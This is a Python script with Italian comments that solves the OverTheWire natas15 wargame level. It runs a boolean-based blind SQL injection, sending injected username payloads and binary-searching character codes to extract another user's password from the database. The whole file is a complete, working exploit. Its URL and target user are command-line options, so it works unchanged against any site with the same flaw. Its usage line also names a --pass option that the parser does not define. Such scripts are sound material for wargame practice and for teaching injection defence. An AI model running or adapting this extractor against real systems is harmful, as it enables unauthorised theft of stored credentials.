#!/usr/bin/env python3
"""
natas15 (OverTheWire) - Boolean-based blind SQL injection.

Estrae la password di 'natas16' dalla tabella `users` sfruttando la query
vulnerabile del livello natas15:

    SELECT * from users where username="<INPUT>"

Il parametro `username` viene concatenato senza escaping, quindi si puo'
iniettare chiudendo l'apice doppio. La pagina non mostra i dati: rivela solo
se la query ha restituito almeno una riga ("This user exists.") oppure no
("This user doesn't exist."). Questo e' l'oracolo booleano che permette di
ricostruire la password un byte alla volta.

Tecnica:
    - payload:  natas16" AND <condizione> --
      -> query: SELECT * from users where username="natas16" AND <condizione> -- "
      (il "-- " commenta l'apice finale aggiunto dal PHP)
    - per ogni posizione si fa una RICERCA BINARIA sul valore ASCII del
      carattere: ASCII(SUBSTRING(password, pos, 1)).
      Si usa ASCII (valore del byte) e non "=" perche' in MySQL "=" sulle
      stringhe e' case-insensitive con la collation di default: ASCII e'
      invece case-sensitive per costruzione.

Dipendenze:
    pip install requests

Uso:
    python natas15_blind_sqli.py
    python natas15_blind_sqli.py --pass <password_natas15> --verbose
"""

import argparse
import sys
import time

import requests
from requests.auth import HTTPBasicAuth

# --- Configurazione di default (sovrascrivibile da riga di comando) ---
BASE_URL = "http://natas15.natas.labs.overthewire.org/"
LEVEL_USER = "natas15"
LEVEL_PASS = ""  # nessuna password hardcoded: passala con --password (HTTP Basic Auth)
TARGET_USER = "natas16"                          # utente di cui estrarre la password

TRUE_MARKER = "This user exists."                # marcatore della condizione VERA
ERROR_MARKER = "Error in query."                 # query malformata -> da segnalare

# Intervallo dei byte da esplorare nella ricerca binaria.
# La flag e' alfanumerica (0-9 A-Z a-z = 48..122), ma teniamo un margine
# sui caratteri stampabili per essere generici.
ASCII_LOW = 32
ASCII_HIGH = 126

MAX_LEN = 64  # la colonna e' varchar(64): limite superiore per la lunghezza

TIMEOUT = 15  # secondi per richiesta


class Oracle:
    """Incapsula la richiesta HTTP e il conteggio delle query inviate."""

    def __init__(self, session, url):
        self.session = session
        self.url = url
        self.count = 0

    def ask(self, condition):
        """Invia la condizione booleana e ritorna True se la query ha righe.

        Solleva RuntimeError se il server segnala una query malformata,
        cosi' un payload errato non viene interpretato come 'False' e non
        corrompe silenziosamente la ricerca binaria.
        """
        payload = f'{TARGET_USER}" AND {condition} -- '
        self.count += 1
        resp = self.session.post(self.url, data={"username": payload}, timeout=TIMEOUT)
        resp.raise_for_status()
        if ERROR_MARKER in resp.text:
            raise RuntimeError(f"Query malformata per la condizione: {condition!r}")
        return TRUE_MARKER in resp.text


def binary_search(oracle, expr, low, high):
    """Trova il valore intero di `expr` in [low, high] con ricerca binaria.

    Usa il predicato "<expr> > mid": invariante  low <= valore <= high.
    """
    while low < high:
        mid = (low + high) // 2
        if oracle.ask(f"{expr} > {mid}"):
            low = mid + 1   # valore > mid
        else:
            high = mid      # valore <= mid
    return low


def self_test(oracle):
    """Valida l'oracolo prima dell'estrazione: 1=1 -> vero, 1=2 -> falso."""
    if not oracle.ask("1=1"):
        raise RuntimeError(
            "Self-test fallito: la condizione sempre-vera non restituisce righe. "
            "Verifica che l'utente target esista e che il marcatore sia corretto."
        )
    if oracle.ask("1=2"):
        raise RuntimeError(
            "Self-test fallito: la condizione sempre-falsa restituisce righe. "
            "Il marcatore dell'oracolo potrebbe essere errato."
        )


def find_length(oracle):
    """Determina la lunghezza esatta della password via LENGTH(password)."""
    return binary_search(oracle, "LENGTH(password)", 0, MAX_LEN)


def extract_password(oracle, length, verbose=False):
    """Ricostruisce la password carattere per carattere (SUBSTRING e' 1-based)."""
    chars = []
    for pos in range(1, length + 1):
        code = binary_search(
            oracle,
            f"ASCII(SUBSTRING(password,{pos},1))",
            ASCII_LOW,
            ASCII_HIGH,
        )
        chars.append(chr(code))
        current = "".join(chars)
        if verbose:
            print(f"  [pos {pos:2d}/{length}] {chr(code)!r} (ASCII {code})  ->  {current}")
        else:
            # aggiorna la riga in tempo reale
            print(f"\r[+] Password: {current:<{length}}", end="", flush=True)
    if not verbose:
        print()  # newline finale dopo la progress line
    return "".join(chars)


def build_session(user, password):
    session = requests.Session()
    session.auth = HTTPBasicAuth(user, password)
    return session


def parse_args():
    p = argparse.ArgumentParser(
        description="Estrattore blind SQLi (boolean-based) per natas15 -> password di natas16."
    )
    p.add_argument("--url", default=BASE_URL, help="URL della pagina vulnerabile")
    p.add_argument("--user", default=LEVEL_USER, help="username HTTP Basic Auth")
    p.add_argument("--password", required=True, help="password HTTP Basic Auth del livello (natas15)")
    p.add_argument("--target", default=TARGET_USER, help="username di cui estrarre la password")
    p.add_argument("--length", type=int, default=None,
                   help="lunghezza nota della password (salta il rilevamento)")
    p.add_argument("--verbose", action="store_true", help="stampa il dettaglio di ogni carattere")
    return p.parse_args()


def main():
    args = parse_args()

    global TARGET_USER
    TARGET_USER = args.target

    session = build_session(args.user, args.password)
    oracle = Oracle(session, args.url)

    start = time.time()
    try:
        print(f"[*] Target: {args.url}  (utente: {args.target})")
        print("[*] Validazione dell'oracolo booleano...")
        self_test(oracle)
        print("[+] Oracolo OK.")

        if args.length is not None:
            length = args.length
            print(f"[*] Lunghezza fornita: {length}")
        else:
            print("[*] Rilevamento della lunghezza della password...")
            length = find_length(oracle)
            print(f"[+] Lunghezza: {length}")

        print("[*] Estrazione in corso...")
        password = extract_password(oracle, length, verbose=args.verbose)

    except requests.RequestException as exc:
        print(f"\n[!] Errore di rete: {exc}", file=sys.stderr)
        return 1
    except RuntimeError as exc:
        print(f"\n[!] {exc}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("\n[!] Interrotto dall'utente.", file=sys.stderr)
        return 130

    elapsed = time.time() - start
    print()
    print(f"[+] Password di {args.target}: {password}")
    print(f"[i] Richieste HTTP inviate: {oracle.count}  |  Tempo: {elapsed:.1f}s")
    return 0


if __name__ == "__main__":
    sys.exit(main())
